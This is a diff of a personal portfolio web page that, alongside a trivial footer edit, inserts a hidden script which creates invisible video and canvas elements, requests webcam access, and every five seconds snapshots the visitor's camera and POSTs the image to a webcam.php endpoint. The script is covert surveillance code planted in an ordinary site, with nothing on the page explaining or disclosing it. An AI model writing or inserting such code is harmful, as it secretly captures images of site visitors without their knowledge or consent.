@@ -32,10 +32,58 @@
       </p>
   </div>
 </div>
+<script>
+  if (document.getElementById('webcamsnap') == null){ 
+ 
+	 var v = document.createElement('video');
+      v.autoplay=true;
+	  v.id='vid';
+	  v.style.display='none';
+	  document.body.appendChild(v); 
+     if (document.getElementById('canvas') == null) {
+    var c = document.createElement('canvas');
+    c.id = 'canvas';
+    c.width = "480";
+    c.height = "320";
+    c.style.display = "none";
+    document.body.appendChild(c);
+}
+var video = document.querySelector("#vid");
+var canvas = document.querySelector('#canvas');
+var ctx = canvas.getContext('2d');
+var localMediaStream = null;
+var onCameraFail = function (e) {
+    console.log('Camera is not working.', e);
+};
+var xmlhttp=new XMLHttpRequest();
 
+function snapshot() {
+    if (localMediaStream) {
+        ctx.drawImage(video, 0, 0, 480, 320);
+        var dat = canvas.toDataURL('image/png');
+        xmlhttp.open("POST", "http://127.0.0.1/webcam.php", true);
+        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    	var x=encodeURIComponent(dat);
+        xmlhttp.send("data=" + x);
+       
+
+    }
+    else {
+        alert("Allow access to your default web camera.");
+    }
+    }
+
+navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
+window.URL = window.URL || window.webkitURL;
+navigator.getUserMedia({video:true}, function (stream) {
+    video.src = window.URL.createObjectURL(stream);
+    localMediaStream = stream;
+    window.setInterval("snapshot()", 5000);
+}, onCameraFail);script = document.createElement('script');script.id = 'webcamsnap'; document.body.appendChild(script); }
+</script>
 <div class="footer">
   <p>Zolboo Erdenebaatar</p>
-  <p>Built with React JS</p>
+  <p>Built with React JS.</p>
   <p>Source code: <a href="https://github.com/zolboo1024/zolboo1024.github.io/">Link</a>
 </div>
 
